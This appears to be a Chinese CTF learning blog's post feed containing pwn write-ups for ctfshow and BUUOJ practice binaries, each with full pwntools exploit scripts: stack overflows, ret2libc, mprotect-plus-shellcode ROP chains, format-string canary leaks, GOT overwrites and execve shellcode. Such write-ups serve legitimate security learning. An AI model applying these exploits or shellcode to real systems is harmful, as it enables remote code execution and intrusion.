<li>所以我们的思路是利用栈溢出，将strcpy的返回地址覆盖成shellcode的地址就可以了<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import c_uint</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch = &quot;amd64&quot;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &quot;i386&quot;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28207</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">success = <span class="number">0x804870E</span></span><br><span class="line">length = <span class="number">261</span></span><br><span class="line"><span class="comment">#(0x11+4)是dest的偏移量</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x11</span>+<span class="number">4</span>) + p32(success)</span><br><span class="line">payload = payload.ljust(length,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;[+] Check your permissions:&quot;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>pwn125(scanf也可以调用system)</title>
    <url>/2025/03/05/pwn125-scanf%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%B0%83%E7%94%A8system/</url>
    <content><![CDATA[<ol>
<li><p>关键词眼：mov     rsi, rax；说明scanf也可以调用system</p>
</li>
<li><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn125&#x27;</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn125&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,xxxxx)</span><br><span class="line"></span><br><span class="line">call_system = <span class="number">0x400672</span></span><br><span class="line"><span class="comment">#0x2000为偏移量</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + cyclic(<span class="number">0x2000</span>) + p64(call_system)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>pwn31</title>
    <url>/2025/01/30/pwn31/</url>
    <content><![CDATA[<h1 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h1><ol>
<li><p>先用IDA打开，并分析</p>
<p><img src="/2025/01/30/pwn31/1.png" alt="1"></p>
</li>
</ol>
<p>​       <img src="/2025/01/30/pwn31/2.png" alt="2"></p>
<p>2.在用checksec检查一下<br>      <img src="/2025/01/30/pwn31/3.png" alt="3"></p>
<p>3.首先我们可以用泄露的main地址减去真实的main地址，就可以得到偏移值<br>4.我们先可以通IDA找到偏移值</p>
<p><img src="/2025/01/30/pwn31/6.png" alt="6"></p>
<p>5.通过got表中puts函数的地址打印出puts函数真实的地址<br>6.泄露出puts的地址，因为，在ctfshow函数了，函数的最后有一个mov ebx，DWORD PTR[ebp-0x4]<br>那么ebx是怎么得来的呢？是通过__x86.get_pc_thunk.bx这个东西得来的，这个东西的作用是将下一条指令的地址赋给ebx寄存器，然后通过加上一个偏移，得到当前进程GOT表的地址，并以此作为后续操作的基地址。这个pwn程序的GOT表地址为0x1fc0，则ebx &#x3D; base_addr + 0x1fc0，这个是摘取<a href="https://blog.csdn.net/weixin_52635170/article/details/131304799">大佬的wp</a>。<br><img src="/2025/01/30/pwn31/5.png" alt="5"></p>
<p>7.先查pwn的got表的地址<br><img src="/2025/01/30/pwn31/4.png" alt="4"></p>
<p>8.然后就可以编写payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">r = remote(<span class="string">&quot;ip&quot;</span>,端口)</span><br><span class="line"><span class="comment">#r = process(&quot;./pwn&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">main_real_addr= <span class="built_in">int</span>(r.recv().strip(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_real_addr))</span><br><span class="line">base_addr = main_real_addr - elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">puts_plt = base_addr + elf.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = base_addr + elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">ctfshow_addr = base_addr + elf.sym[<span class="string">&quot;ctfshow&quot;</span>]</span><br><span class="line">ebx = base_addr + <span class="number">0x1fc0</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">132</span> + p32(ebx) + <span class="string">b&#x27;B&#x27;</span>*<span class="number">4</span> + p32(puts_plt) + p32(main_real_addr) + p32(puts_got)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">puts_addr = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">140</span> + p32(system) + p32(ctfshow_addr) + p32(bin_sh )</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag<br><img src="/2025/01/30/pwn31/7.png" alt="7"></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>pwn2_sctf_2016(整数溢出)</title>
    <url>/2025/02/18/pwn2-sctf-2016-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h2 id="整数溢出的题型记录一下"><a href="#整数溢出的题型记录一下" class="headerlink" title="整数溢出的题型记录一下"></a>整数溢出的题型记录一下</h2><ol>
<li>打开IDA，发现有一个新定义的get函数<br><img src="/2025/02/18/pwn2-sctf-2016-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/1.png" alt="1"></li>
</ol>
<p>​       整数溢出可以用 -1 进行绕过</p>
<ol start="2">
<li><p>在IDA中没有找到shell所以只能通过libc泄露（有printf）</p>
</li>
<li><p>可以开始写exp了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#r = process(&#x27;./pwn2_sctf_2016&#x27;)</span><br><span class="line">r=remote(&#x27;node5.buuoj.cn&#x27;,29975)</span><br><span class="line">elf=ELF(&#x27;./pwn2_sctf_2016&#x27;)</span><br><span class="line">offset = (0x2c+4)</span><br><span class="line">printf_plt=elf.plt[&#x27;printf&#x27;]</span><br><span class="line">printf_got=elf.got[&#x27;printf&#x27;]</span><br><span class="line">main=elf.sym[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">r.recvuntil(&#x27;How many bytes do you want me to read? &#x27;)</span><br><span class="line">r.sendline(&#x27;-1&#x27;)</span><br><span class="line">r.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">payload=b&#x27;a&#x27;*offset+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">printf_addr=u32(r.recv(4))</span><br><span class="line">print(hex(printf_addr))</span><br><span class="line">libc=LibcSearcher(&#x27;printf&#x27;,printf_addr)</span><br><span class="line"></span><br><span class="line">libc_base=printf_addr-libc.dump(&#x27;printf&#x27;)</span><br><span class="line">system=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&#x27;How many bytes do you want me to read? &#x27;)</span><br><span class="line">r.sendline(&#x27;-1&#x27;)</span><br><span class="line">r.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">payload=b&#x27;a&#x27;*offset+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>pwn49(静态编译-mprotect函数)</title>
    <url>/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<ol>
<li>首先可以了解mprotect函数，这有<a href="https://xz.aliyun.com/news/12163?u_atoken=9922fc0d328fb00582f13feaf446cd57&u_asig=1a0c39d417406383087056184e0042&time__1311=YqRxni0=oDqQqGNKeeTR0D9BDBBAtoqOa4D">佬的文章</a>,可以先看一下</li>
<li>静态文件基本都有mprotect函数</li>
<li>我们们的思路基本就是，利用mprotect函数修改某段的权限，然后将shellcode写入这段</li>
</ol>
<p>开始写wp</p>
<ol>
<li><p>先用IDA打开有mprotect函数</p>
</li>
<li><p>用一下命令查看</p>
</li>
</ol>
   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file xxxx #查看是否是静态文件</span><br></pre></td></tr></table></figure>

<p>   <img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/1.png" alt="1"></p>
<p>​    圈出部分显示是静态文件</p>
<ol start="3">
<li><p>我们先用mprotect函数修改一段的权限(就选got表)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readelf -S pwn</span><br></pre></td></tr></table></figure>



<p><img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/2.png" alt="2"></p>
</li>
</ol>
<p>​     可以看到got的起始地址是0x80da000，先构造mprotect的payload</p>
<p>​     查看mprotect函数的地址<br>​     <img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/3.png" alt="3"></p>
<p>用ROPgadget来找pop ret</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only “pop|ret” | grep &quot;pop&quot;</span><br></pre></td></tr></table></figure>



<p><img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/4.png" alt="4"></p>
<p>mprotect的第一个参数是需要修改内存的地址，第二个参数是内存空间的大小，第三是需要赋予的权限，再将mprotect的返回地址设置为read的地址，用来读取shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = (0x12 + 0x04) * b&#x27;a&#x27; </span><br><span class="line">payload += p32(0x0806cdd0) # mprotect函数地址</span><br><span class="line">payload += p32(0x08056194) # 3 pop 1 ret地址	</span><br><span class="line">payload += p32(0x080da000) # 需要修改的内存的起始地址</span><br><span class="line">payload += p32(0x1000) # 修改内存空间的大小</span><br><span class="line">payload += p32(0x7) # 需要赋予的权限</span><br><span class="line">payload += p32(0x806bee0) # read函数地址</span><br></pre></td></tr></table></figure>



<p>再找read的地址,0x806BEE0,read第一个参数是一随便写点就可以，参数二就是我们的shellcode，参数三是读取的大小<br><img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/5.png" alt="5"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = (0x12 + 0x04) * b&#x27;a&#x27; </span><br><span class="line">payload += p32(0x0806cdd0) # mprotect函数地址</span><br><span class="line">payload += p32(0x08056194) # 3 pop 1 ret地址	</span><br><span class="line">payload += p32(0x080da000) # 需要修改的内存的起始地址</span><br><span class="line">payload += p32(0x1000) # 修改内存空间的大小</span><br><span class="line">payload += p32(0x7) # 需要赋予的权限</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">payload += p32(0x806bee0) # read函数地址</span><br><span class="line">payload += p32(0x080da000) # read函数返回地址(就是我们shellcode所在地址,即我们修改的内存空间的起始地址)</span><br><span class="line">payload += p32(0x0) </span><br><span class="line">payload += p32(0x080da000) # shellcode地址</span><br><span class="line">payload += p32(len(shellcode))</span><br></pre></td></tr></table></figure>



<p>完整exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28313&quot;)</span><br><span class="line">payload = (0x12 + 0x04) * b&#x27;a&#x27; </span><br><span class="line">payload += p32(0x0806cdd0) # mprotect函数地址</span><br><span class="line">payload += p32(0x08056194) # 3 pop 1 ret地址	</span><br><span class="line">payload += p32(0x080da000) # 需要修改的内存的起始地址</span><br><span class="line">payload += p32(0x1000) # 修改内存空间的大小</span><br><span class="line">payload += p32(0x7) # 需要赋予的权限</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">payload += p32(0x806bee0) # read函数地址</span><br><span class="line">payload += p32(0x080da000) # read函数返回地址(就是我们shellcode所在地址,即我们修改的内存空间的起始地址)</span><br><span class="line">payload += p32(0x0) </span><br><span class="line">payload += p32(0x080da000) # shellcode地址</span><br><span class="line">payload += p32(len(shellcode))</span><br><span class="line">r.recvuntil(&quot;    * *************************************                           &quot;)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>pwn54(简单但是挺重要的)</title>
    <url>/2025/02/27/pwn54-%E7%AE%80%E5%8D%95%E4%BD%86%E6%98%AF%E6%8C%BA%E9%87%8D%E8%A6%81%E7%9A%84/</url>
    <content><![CDATA[<ol>
<li>用IDA打开<br><img src="/2025/02/27/pwn54-%E7%AE%80%E5%8D%95%E4%BD%86%E6%98%AF%E6%8C%BA%E9%87%8D%E8%A6%81%E7%9A%84/1.png" alt="1"></li>
</ol>
<p>​      所以我们只要256全部覆满就可以直接把password直接泄出来。</p>
<p>​     <img src="/2025/02/27/pwn54-%E7%AE%80%E5%8D%95%E4%BD%86%E6%98%AF%E6%8C%BA%E9%87%8D%E8%A6%81%E7%9A%84/2.png" alt="2"></p>
<p>   <img src="/2025/02/27/pwn54-%E7%AE%80%E5%8D%95%E4%BD%86%E6%98%AF%E6%8C%BA%E9%87%8D%E8%A6%81%E7%9A%84/3.png" alt="3"></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>pwn98(canary,格式化字符串)</title>
    <url>/2025/02/11/pwn98-canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h1 id="ctfshow-pwn98"><a href="#ctfshow-pwn98" class="headerlink" title="ctfshow pwn98"></a>ctfshow pwn98</h1><ol>
<li><p>由题目意思：Canary？有没有办法绕过呢？知道有canary</p>
</li>
<li><p>有IDA打开<br><img src="/2025/02/11/pwn98-canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1.png" alt="1"></p>
</li>
</ol>
<p>​    存在格式化字符串漏洞</p>
<ol start="3">
<li><p>计算偏移量</p>
<p><img src="/2025/02/11/pwn98-canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2.png" alt="2"></p>
</li>
</ol>
<p>  偏移值是5，在计算一下s到返回地址的是0x34,所以（0x34-canary）&#x2F;4 + 5 &#x3D; a,a就是最终的偏移量,不了解canary的可以<a href="https://blog.csdn.net/Rinko233/article/details/143635468">看这篇文章</a></p>
<ol start="4">
<li>接着找canary<br><img src="/2025/02/11/pwn98-canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/3.png" alt="3"></li>
</ol>
<p>​    a &#x3D; (0x34-0x0c)&#x2F;4 + 5 &#x3D; 15  </p>
<ol start="5">
<li><p>开始写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28195</span>)</span><br><span class="line">getshell = <span class="number">0x80486ce</span> </span><br><span class="line">payload_1 = <span class="string">b&#x27;%15$x&#x27;</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload_1)</span><br><span class="line">canary = <span class="built_in">int</span>(r.recv(),<span class="number">16</span>) <span class="comment">#canary = int(r.recv(8),16) </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">payload_2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x34</span> - <span class="number">0xc</span>) + p32(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(getshell) </span><br><span class="line">r.send(payload_2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>


</li>
<li><p>得到flag<br><img src="/2025/02/11/pwn98-canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/4.png" alt="4"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>pwn94</title>
    <url>/2025/02/11/pwn94/</url>
    <content><![CDATA[<h1 id="pwn94-格式化字符串"><a href="#pwn94-格式化字符串" class="headerlink" title="pwn94(格式化字符串)"></a>pwn94(格式化字符串)</h1><ol>
<li><p>先用IDA打开,可以利用格式化字符串漏洞<br><img src="/2025/02/11/pwn94/1.png" alt="1"></p>
</li>
<li><p>找到system函数<br><img src="/2025/02/11/pwn94/2.png" alt="2"></p>
</li>
<li><p>找到偏移量为6<br><img src="/2025/02/11/pwn94/3.png" alt="3"></p>
</li>
<li><p>构造exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28175</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">sys_plt = elf.plt[<span class="string">&quot;system&quot;</span>]  </span><br><span class="line"><span class="comment">#把printf_got换成sys_plt，当执行printf的时候实实际在执行system函数</span></span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got:sys_plt&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">&quot;bin_sh&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</li>
<li><p>得到flag<br><img src="/2025/02/11/pwn94/4.png" alt="4"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable_start(只能看汇编)</title>
    <url>/2025/03/16/pwnable-start-%E5%8F%AA%E8%83%BD%E7%9C%8B%E6%B1%87%E7%BC%96/</url>
    <content><![CDATA[<ol>
<li><p>这题主要记录一下怎么看汇编</p>
<p><img src="/2025/03/16/pwnable-start-%E5%8F%AA%E8%83%BD%E7%9C%8B%E6%B1%87%E7%BC%96/1.png" alt="1"></p>
</li>
<li><p>这题的思路就是在栈上写入shellcode,所以我们就要去找栈的地址。</p>
<p>这里就需要要一个payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;* 0x14 + p32(0x8048037)</span><br></pre></td></tr></table></figure>

<p>0x8048037就是write的返回地址，send这个payload后esp的内容就是栈上0x8048037的内容，将stack上的内容泄露出来。还就就是为什么是0x14不用加0x04,我们可以看到在retn前没有leave，所以不用+0x04。</p>
</li>
<li><p>用下面这一脚本可泄露stack的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./start&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26163</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x14</span> + p32(<span class="number">0x8048087</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Let&#x27;s start the CTF:&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>stack的地址再加上0x14就回到我们原来的位置了，在接入shellcode就可以了。</p>
<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">e=ELF(<span class="string">&#x27;./start&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">context.arch=e.arch</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">#r=process(&#x27;./start&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29188</span>)</span><br><span class="line"> </span><br><span class="line">shellcode=asm(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">                xor edx,edx;\</span></span><br><span class="line"><span class="string">                xor ecx,ecx;\</span></span><br><span class="line"><span class="string">                push 0x0068732f;\</span></span><br><span class="line"><span class="string">                push 0x6e69622f;\</span></span><br><span class="line"><span class="string">                mov ebx,esp;\</span></span><br><span class="line"><span class="string">                mov eax,0xb;\</span></span><br><span class="line"><span class="string">                int 0x80;\</span></span><br><span class="line"><span class="string">                &quot;</span>)</span><br><span class="line"> </span><br><span class="line">r.recvuntil(<span class="string">&quot;Let&#x27;s start the CTF:&quot;</span>)</span><br><span class="line">pay1=<span class="number">0x14</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x8048087</span>)</span><br><span class="line">r.send(pay1)</span><br><span class="line">stack_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack-&gt;&#x27;</span>,<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"> </span><br><span class="line">r.recv()</span><br><span class="line">pay2=<span class="string">b&#x27;b&#x27;</span>*<span class="number">20</span>+p32(stack_addr+<span class="number">20</span>)+shellcode</span><br><span class="line">r.sendline(pay2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>pwn各类题型总结</title>
    <url>/2025/03/02/pwn%E5%90%84%E7%B1%BB%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<ul>
<li>栈溢出<ul>
<li><a href="#ret2text">ret2text</a></li>
<li><a href="#ret2shellcode">ret2shellcode</a></li>
<li><a href="#ret2libc">ret2libc</a></li>
<li><a href="#ret2syscall">ret2syscall</a></li>
</ul>
</li>
<li><a href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">格式化字符串</a><ul>
<li><a href="#%25n%EF%BF%BD9%EF%BF%BD%EF%BF%BD0@%EF%BF%BD%EF%BF%BD%EF%BF%BD">%n篡改固定地址的变量</a></li>
<li><a href="#%25n%EF%BF%BD9printf_got%07%11system">%n篡改printf_got指向system</a></li>
</ul>
</li>
<li><a href="#canary">canary</a><ul>
<li><a href="#%E7%88%86%E7%A0%B4">爆破</a></li>
<li><a href="#SSP%E6%B3%84%E9%9C%B2Canary">SSP泄露Canary</a></li>
<li><a href="#%E8%A6%86%E7%9B%96%E6%88%AA%E6%96%AD%E5%AD%97%E7%AC%A6%E8%8E%B7%E5%8F%96Canary">覆盖截断字符获取Canary</a></li>
<li><a href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8A%AB%E6%8C%81__stack_chk_fail%E6%8C%87%E9%92%88">格式化字符串劫持__stack_chk_fail指针</a></li>
<li><a href="#canary,%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">canary,格式化字符串</a></li>
<li><a href="#%E8%A6%86%E7%9B%96TCB%E6%9D%A5%E5%AE%9E%E7%8E%B0%E5%AF%B9canary%E7%9A%84%E7%BB%95%E8%BF%87">覆盖TCB来实现对canary的绕过</a></li>
<li><a href="#puts%E6%B3%84%E9%9C%B2canary">puts泄露canary</a></li>
</ul>
</li>
<li><a href="#PIE%E7%BB%95%E8%BF%87">PIE绕过</a><ul>
<li><a href="#%E7%88%86%E7%A0%B4pie">爆破pie</a></li>
<li>[格式化字符串泄露pie和partial write](#格式化字符串泄露pie和partial write)</li>
<li><a href="#%E5%88%A9%E7%94%A8vsyscall%E5%9C%B0%E5%9D%80%E4%B8%8D%E5%8F%98">利用vsyscall地址不变</a></li>
</ul>
</li>
</ul>
<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>见我的另一篇<a href="http://linkpwn.github.io/2025/02/24/pwn-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">文章</a></p>
<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>见我的另一篇<a href="http://linkpwn.github.io/2025/02/28/pwn-%E9%83%A8%E5%88%86shellcode%E6%80%BB%E7%BB%93/">文章</a></p>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>见我的另一篇<a href="http://linkpwn.github.io/2025/02/20/libc%E6%B3%84%E9%9C%B2/">文章</a></p>
<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>见我的另一篇<a href="http://linkpwn.github.io/2025/03/02/ret2syscall/">文章</a>，完全是学长写的，我是勤劳的搬运工</p>
<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="n篡改固定地址的变量"><a href="#n篡改固定地址的变量" class="headerlink" title="%n篡改固定地址的变量"></a>%n篡改固定地址的变量</h3><p>见我的另一篇<a href="http://linkpwn.github.io/2025/02/10/jarvisoj-fm-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">文章</a>(x_32)</p>
<p>x64位————与32的区别</p>
<ol>
<li><p>首先我们要补一个b来确定偏移量</p>
<p>例如我们32位是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br></pre></td></tr></table></figure>

<p>而64位是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">baaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br></pre></td></tr></table></figure>
</li>
<li><p>由于64位传参，肯定存在被&#x2F;x00截断的情况,所以我们需要动调一下,其实我们也可以多试几下，假设我们我们泄露出来的是8，真实的也许就是7，9，10等。</p>
<p>动调挺简单我就覆两个图片</p>
<ul>
<li><p>先是一下直接泄露的8<br><img src="/2025/03/02/pwn%E5%90%84%E7%B1%BB%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/4.png" alt="4"></p>
